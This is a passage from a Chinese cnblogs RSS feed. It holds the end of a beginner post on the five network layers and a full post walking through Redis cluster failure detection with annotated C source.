&lt;p&gt;     1.&lt;strong&gt;应用层&lt;/strong&gt;：应用层是整个层次最顶层，直接和最原始数据打交道，定义的是应用进程间通信和交互的规则。这是什么意思？因为两台电脑通讯就是发送方把数据传给接收方，虽然发送方知道自己发送的是什么东西、转化成字节数组之后有多长，但接收方肯定不知道，所以应用层的网络协议诞生了，他规定发送方和接收方必须使用一个固定长度的消息头，消息头必须使用某种固定的组成，而且消息头里必须记录消息体的长度等一系列信息，以方便接收方能够正确的解析发送方发送的数据。如果没有应用层的规则，那么接收方拿到数据后也是不知所措，就如同拿到一个没有说明书的工具无法操作。&lt;/p&gt;
&lt;p&gt;     2.&lt;strong&gt;运输层&lt;/strong&gt;：负责向两个主机中进程之间的通信提供通用数据服务，“传输层”的功能，就是建立”端口到端口”的通信。例如，同一台主机上有许多程序都需要用到网络，假设你一边在看网页，一边上QQ聊天。当一个数据包从互联网上发来的时候，你怎么知道，它是表示网页的内容，还是表示QQ聊天的内容？也就是说，我们还需要一个参数，表示这个数据包到底供哪个程序（进程）使用。这个参数就叫做”端口”（port），它其实是每一个使用网卡的程序的编号。每个数据包都发到主机的特定端口，所以不同的程序就能取到自己所需要的数据。“端口”是0到65535之间的一个整数，正好16个二进制位。0到1023的端口被系统占用，用户只能选用大于1023的端口。不管是浏览网页还是在线聊天，应用程序会随机选用一个端口，然后与服务器的相应端口联系。&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt; 3.网络层&lt;/strong&gt;：”网络层”的功能是建立”主机到主机”的通信。通过网络层我们能找到其他一台电脑的所在位置并进行主机到主机连接。每台计算机有了两种地址，一种是MAC地址，另一种是网络地址。两种地址之间没有任何联系，MAC地址是绑定在网卡上的，网络地址则是管理员分配的，它们只是随机组合在一起。网络地址帮助我们确定计算机所在的子网络，MAC地址则将数据包送到该子网络中的目标网卡。&lt;/p&gt;
&lt;p&gt;     4.&lt;strong&gt;数据链路层&lt;/strong&gt;：两个相邻节点之间传送数据时，数据链路层将网络层交下来的IP数据报组装成帧，在两个相邻的链路上传送帧（frame)。由于网络层移交的ip数据包数据可能会很多，所以要进行分组封装成帧，每一帧包括数据和必要的控制信息。其实就是解读电信号，进行分组。封装成帧，透明传输，差错控制。&lt;/p&gt;
&lt;p&gt;     5.&lt;strong&gt;物理层&lt;/strong&gt;：电脑要组网，第一件事要干什么？当然是先把电脑连起来，可以用光缆、电缆、双绞线、无线电波等方式，它就是把电脑连接起来的物理手段，它主要规定了网络的一些电气特性，将本电脑要传输的数据帧变成010101的比特流，发送出去，作用是负责传送0和1的电信号。&lt;/p&gt;
&lt;p&gt;     这里举个例子来说明下，比如A与B要通讯，A向B请求发送了一份数据。首先A在请求链接里面可以获取到B的地址，要发送的这份数据首先经过运输层，制定了一系列规则，比如数据的格式怎样，长度多少，以方便接收方能够正确的解析发送方发送的数据；接下来进入运输层，把进程端口封装在数据包，这样才知道是A当前电脑哪个进程发的数据包；再接下是进入网络层，通过ip地址找到B主机所在位置并进行相连；然后进入数据链路层，将ip数据包封装成帧；最后进入物理层，进行数据帧转换成比特流0或1,通过硬件光纤进行传输；这一整套是A的通讯过程，对于·B而言就是相反的过程。&lt;/p&gt;

&lt;p&gt;===========================================================================&lt;/p&gt;
&lt;p&gt;                               &lt;span data-mce-=&quot;&quot;&gt;&lt;strong&gt; 用心查阅，有心分享，分享之际，互相指教，受益你我，何乐不为？&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; ===========================================================================&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 13:15:00 +0000</pubDate>
<dc:creator>浴血卫国</dc:creator>
<og:description>在我看来，学习java最重要是要理解what(这东西是什么)，why(为什么要用它)，where(在哪用它)，how(怎么用)。所以接下来，我都是以这样的思想来和大家交流，从最基础的知识讲起。如果有啥</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/pla1949/p/9743578.html</dc:identifier>
</item>
<item>
<title>Redis源码阅读（五）集群-故障迁移（上） - gogo一</title>
<link>http://www.cnblogs.com/gogoCome/p/9751490.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/gogoCome/p/9751490.html</guid>
<description>&lt;p&gt;　　故障迁移是集群非常重要的功能；直白的说就是在集群中部分节点失效时，能将失效节点负责的键值对迁移到其他节点上，从而保证整个集群系统在部分节点失效后没有丢失数据，仍能正常提供服务。这里先抛开Redis实际的做法，我们可以自己想下对于Redis集群应该怎么做故障迁移，哪些关键点是必须要实现的。然后再去看Redis源码中具体的实现，是否覆盖了我们想到的关键点，有哪些设计是我们没有想到的，这样看代码的效果会比较好。&lt;/p&gt;
&lt;p&gt;　　我在思考故障迁移这个功能时，首先想到的是节点发生故障时要很快被集群中其他节点发现，尽量缩短集群不可用的时间；其次就是要选出失效节点上的数据可以被迁移到哪个节点上；在选择迁移节点时最好能够考虑节点的负载，避免迁移造成部分节点负载过高。另外，失效节点的数据在其失效前就应该实时的复制到其他节点上，因为一般情况下节点失效有很大概率是机器不可用，如果没有事先执行过数据复制，节点数据就丢失了。最后，就是迁移的执行，除了要将失效节点原有的键值对数据迁移到其他节点上，还要将失效节点原来负责的槽也迁移到其他节点上，而且槽和键值对应该同步迁移，要避免槽被分配到节点A而槽所对应的键值对被分配到节点B的情况。&lt;/p&gt;
&lt;p&gt;　　总结起来有实现集群故障迁移要实现下面关键点：&lt;/p&gt;
&lt;p&gt;　　1. 节点失效事件能被集群系统很快的发现&lt;/p&gt;
&lt;p&gt;　　2. 迁移时要能选择合适的节点&lt;/p&gt;
&lt;p&gt;　　3. 节点数据需要实时复制，在失效后可以直接使用复制的数据进行迁移&lt;/p&gt;
&lt;p&gt;　　4. 迁移要注意将槽和键值对同步迁移&lt;/p&gt;
&lt;p&gt;　　看过Redis源码后，发现Redis的故障迁移也是以主备复制为基础的，也就是说需要给每个集群主节点配置从节点，这样主节点的数据天然就是实时复制的，在主节点出现故障时，直接在从节点中选择一个接替失效主节点，将该从节点升级为主节点并通知到集群中所有其他节点即可，这样就无需考虑上面提到的第三点和第四点。如果集群中有节点没有配置从节点，那么就不支持故障迁移。&lt;/p&gt;
&lt;hr/&gt;
&lt;h3&gt;故障检测&lt;/h3&gt;
&lt;p&gt;　　Redis的集群是无中心的，无法通过中心定时向各个节点发送心跳来判断节点是否故障。在Redis源码中故障的检测分三步：&lt;/p&gt;
&lt;h4&gt;1. 节点互发ping消息，将Ping超时的节点置为疑似下线节点&lt;/h4&gt;
&lt;p&gt;　　在这一步中，每个节点都会向其他节点发送Ping消息，来检测其他节点是否和自己的连接有异常。但要注意的是即便检测到了其他节点Ping消息超时，也不能简单的认为其他节点是失效的，因为有可能是这个节点自己的网络异常，无法和其他节点通信。所以在这一步只是将检测到超时的节点置为疑似下线。例如：节点A向节点B发送Ping发现超时，则A会将节点B的状态置为疑似下线并保存在自己记录的集群节点信息中，存储的疑似下线信息就是之前提过的clusterState.nodes里对应的失效节点的flags状态值。&lt;/p&gt;
&lt;p&gt;　　// 默认节点超时时限&lt;/p&gt;
&lt;p&gt;　　#define REDIS_CLUSTER_DEFAULT_NODE_TIMEOUT 15000&lt;/p&gt;
&lt;h4&gt; 2. 向其他节点共享疑似下线节点&lt;/h4&gt;
&lt;p&gt;　　在检测到某个节点为疑似下线之后，会将这个节点的疑似下线情况分享给集群中其他的节点，分享的方式也是通过互发Ping消息，在ping消息中会带上集群中随机的三个节点的状态，前面在分析集群初始化时，曾介绍过利用gossip协议扩散集群节点状态给整个集群，这里节点的疑似下线状态也是通过这种方式传播给其他节点的。每条ping消息会带最多三个随机节点的状态信息&lt;/p&gt;
&lt;div readability=&quot;21&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&lt;span&gt;void&lt;/span&gt; clusterSendPing(clusterLink *link, &lt;span&gt;int&lt;/span&gt; type) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt;随机算去本节点所在集群中的任意两个其他node节点(不包括link本节点和link对应的节点)信息发送给link对应的节点&lt;/span&gt;
    unsigned &lt;span&gt;char&lt;/span&gt; buf[&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(clusterMsg)];
    clusterMsg &lt;/span&gt;*hdr = (clusterMsg*&lt;span&gt;) buf;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; gossipcount = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;, totlen;
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; freshnodes is the number of nodes we can still use to populate the
     * gossip section of the ping packet. Basically we start with the nodes
     * we have in memory minus two (ourself and the node we are sending the
     * message to). Every time we add a node we decrement the counter, so when
     * it will drop to &amp;lt;= zero we know there is no more gossip info we can
     * send. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt; freshnodes = dictSize(server.cluster-&amp;gt;nodes)-&lt;span&gt;2&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;除去本节点和接收本ping信息的节点外，整个集群中有多少其他节点
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果发送的信息是 PING ，那么更新最后一次发送 PING 命令的时间戳&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (link-&amp;gt;node &amp;amp;&amp;amp; type ==&lt;span&gt; CLUSTERMSG_TYPE_PING)
        link&lt;/span&gt;-&amp;gt;node-&amp;gt;ping_sent =&lt;span&gt; mstime();
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将当前节点的信息（比如名字、地址、端口号、负责处理的槽）记录到消息里面&lt;/span&gt;
&lt;span&gt;    clusterBuildMessageHdr(hdr,type);
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Populate the gossip fields &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 从当前节点已知的节点中随机选出两个节点   
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 并通过这条消息捎带给目标节点，从而实现 gossip 协议  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 每个节点有 freshnodes 次发送 gossip 信息的机会  
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 每次向目标节点发送 3 个被选中节点的 gossip 信息（gossipcount 计数）&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt;(freshnodes &amp;gt; &lt;span&gt;0&lt;/span&gt; &amp;amp;&amp;amp; gossipcount &amp;lt; &lt;span&gt;3&lt;/span&gt;&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 从 nodes 字典中随机选出一个节点（被选中节点）&lt;/span&gt;
        dictEntry *de = dictGetRandomKey(server.cluster-&amp;gt;&lt;span&gt;nodes);
        clusterNode &lt;/span&gt;*&lt;span&gt;this&lt;/span&gt; =&lt;span&gt; dictGetVal(de);

        clusterMsgDataGossip &lt;/span&gt;*gossip; &lt;span&gt;///&lt;/span&gt;&lt;span&gt;/ping  pong meet消息体部分用该结构&lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt;&lt;span&gt; j;
&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt; == myself ||
            &lt;span&gt;this&lt;/span&gt;-&amp;gt;flags &amp;amp; (REDIS_NODE_HANDSHAKE|REDIS_NODE_NOADDR) ||&lt;span&gt;
            (&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;-&amp;gt;link == NULL &amp;amp;&amp;amp; &lt;span&gt;this&lt;/span&gt;-&amp;gt;numslots == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;))
        {
                freshnodes&lt;/span&gt;--; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; otherwise we may loop forever. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
                &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Check if we already added this node &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
         &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 检查被选中节点是否已经在 hdr-&amp;gt;data.ping.gossip 数组里面       
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果是的话说明这个节点之前已经被选中了   
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不要再选中它（否则就会出现重复）&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; gossipcount; j++) {  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里是避免前面随机选择clusterNode的时候重复选择相同的节点&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (memcmp(hdr-&amp;gt;data.ping.gossip[j].nodename,&lt;span&gt;this&lt;/span&gt;-&amp;gt;&lt;span&gt;name,
                    REDIS_CLUSTER_NAMELEN) &lt;/span&gt;== &lt;span&gt;0&lt;/span&gt;) &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (j != gossipcount) &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Add it &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这个被选中节点有效，计数器减一&lt;/span&gt;
        freshnodes--&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 指向 gossip 信息结构&lt;/span&gt;
        gossip = &amp;amp;(hdr-&amp;gt;&lt;span&gt;data.ping.gossip[gossipcount]);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将被选中节点的名字记录到 gossip 信息    &lt;/span&gt;
        memcpy(gossip-&amp;gt;nodename,&lt;span&gt;this&lt;/span&gt;-&amp;gt;&lt;span&gt;name,REDIS_CLUSTER_NAMELEN);  
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将被选中节点的 PING 命令发送时间戳记录到 gossip 信息       &lt;/span&gt;
        gossip-&amp;gt;ping_sent = htonl(&lt;span&gt;this&lt;/span&gt;-&amp;gt;&lt;span&gt;ping_sent);      
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将被选中节点的 PING 命令回复的时间戳记录到 gossip 信息     &lt;/span&gt;
        gossip-&amp;gt;pong_received = htonl(&lt;span&gt;this&lt;/span&gt;-&amp;gt;&lt;span&gt;pong_received);   
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将被选中节点的 IP 记录到 gossip 信息       &lt;/span&gt;
        memcpy(gossip-&amp;gt;ip,&lt;span&gt;this&lt;/span&gt;-&amp;gt;ip,&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;-&amp;gt;&lt;span&gt;ip));    
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将被选中节点的端口号记录到 gossip 信息    &lt;/span&gt;
        gossip-&amp;gt;port = htons(&lt;span&gt;this&lt;/span&gt;-&amp;gt;&lt;span&gt;port);       
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将被选中节点的标识值记录到 gossip 信息   &lt;/span&gt;
        gossip-&amp;gt;flags = htons(&lt;span&gt;this&lt;/span&gt;-&amp;gt;&lt;span&gt;flags);       
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这个被选中节点有效，计数器增一&lt;/span&gt;
        gossipcount++&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 计算信息长度    &lt;/span&gt;
    totlen = &lt;span&gt;sizeof&lt;/span&gt;(clusterMsg)-&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(union clusterMsgData);  
    totlen &lt;/span&gt;+= (&lt;span&gt;sizeof&lt;/span&gt;(clusterMsgDataGossip)*&lt;span&gt;gossipcount);    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将被选中节点的数量（gossip 信息中包含了多少个节点的信息）   
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 记录在 count 属性里面   &lt;/span&gt;
    hdr-&amp;gt;count =&lt;span&gt; htons(gossipcount);   
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将信息的长度记录到信息里面  &lt;/span&gt;
    hdr-&amp;gt;totlen =&lt;span&gt; htonl(totlen);   
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 发送信息&lt;/span&gt;
&lt;span&gt;    clusterSendMessage(link,buf,totlen);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　收到ping消息的节点，如果发现ping消息中带的某个节点属于疑似下线状态，则找到自身记录该节点的ClusterNode结构，并向该结构的下线报告链表中插入一条上报记录，上报源头为发出Ping的节点。例如：节点A向节点C发送了ping消息， ping消息中带上B节点状态，并且B节点状态为疑似下线，那么C节点收到这个Ping消息之后，就会查找自身记录节点B的clusterNode，向这个clusterNode的fail_reports链表中插入来自A的下线报告。&lt;/p&gt;
&lt;div readability=&quot;12.5&quot;&gt;
&lt;h4&gt;3. 收到集群中超过半数的节点认为某节点处于疑似下线状态，则判定该节点下线，并广播&lt;/h4&gt;
&lt;p&gt;　　判定的时机是在每次收到一条ping消息的时候，当发现ping消息中带有某节点的疑似下线状态后，除了加入该节点的下线报告以外，还会调用markNodeAsFailingIfNeeded函数来尝试判断该节点是否已经被超过半数的节点判断为疑似下线，如果是的话，就将该节点状态置为下线，并调用clusterSendFail函数将下线状态广播给所有已知节点。这里广播不是通过订阅分发的方式，而是遍历所有节点，并给每个节点单独发送消息。&lt;/p&gt;
&lt;div readability=&quot;18.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;void&lt;/span&gt; clusterSendFail(&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;nodename) { 
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果超过一半的主节点认为该nodename节点下线了，则需要把该节点下线信息同步到整个cluster集群&lt;/span&gt;
    unsigned &lt;span&gt;char&lt;/span&gt; buf[&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(clusterMsg)];
    clusterMsg &lt;/span&gt;*hdr = (clusterMsg*&lt;span&gt;) buf;
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建下线消息 &lt;/span&gt;
&lt;span&gt;     clusterBuildMessageHdr(hdr,CLUSTERMSG_TYPE_FAIL); 
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 记录命令 &lt;/span&gt;
     memcpy(hdr-&amp;gt;&lt;span&gt;data.fail.about.nodename,nodename,REDIS_CLUSTER_NAMELEN); 
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 广播消息&lt;/span&gt;
    clusterBroadcastMessage(buf,ntohl(hdr-&amp;gt;&lt;span&gt;totlen));
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;void&lt;/span&gt; clusterBroadcastMessage(&lt;span&gt;void&lt;/span&gt; *buf, size_t len) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt;buf里面的内容为clusterMsg+clusterMsgData&lt;/span&gt;
    dictIterator *&lt;span&gt;di;
    dictEntry &lt;/span&gt;*&lt;span&gt;de;

     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 遍历所有已知节点&lt;/span&gt;
    di = dictGetSafeIterator(server.cluster-&amp;gt;&lt;span&gt;nodes);
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;((de = dictNext(di)) !=&lt;span&gt; NULL) {
        clusterNode &lt;/span&gt;*node =&lt;span&gt; dictGetVal(de);

         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不向未连接节点发送信息&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!node-&amp;gt;link) &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;

         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不向节点自身或者 HANDSHAKE 状态的节点发送信息&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (node-&amp;gt;flags &amp;amp; (REDIS_NODE_MYSELF|&lt;span&gt;REDIS_NODE_HANDSHAKE))
            &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;

         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 发送信息&lt;/span&gt;
        clusterSendMessage(node-&amp;gt;&lt;span&gt;link,buf,len);
    }
    dictReleaseIterator(di);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　从节点判断自己所属的主节点下线，则开始进入故障转移流程。如果主节点下只有一个从节点，那么很自然的可以直接进行切换，但如果主节点下的从节点不只一个，那么还需要选出一个新的主节点。这里的选举过程使用了比较经典的分布式一致性算法Raft，下一篇会介绍Redis中选举新主节点的过程。&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Sun, 07 Oct 2018 13:11:00 +0000</pubDate>
<dc:creator>gogo一</dc:creator>
<og:description>Redis源码阅读（五）集群-故障迁移（上） 故障迁移是集群非常重要的功能；直白的说就是在集群中部分节点失效时，能将失效节点负责的键值对迁移到其他节点上，从而保证整个集群系统在部分节点失效后没有丢失数</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/gogoCome/p/9751490.html</dc:identifier>
</item>
</channel>
</rss>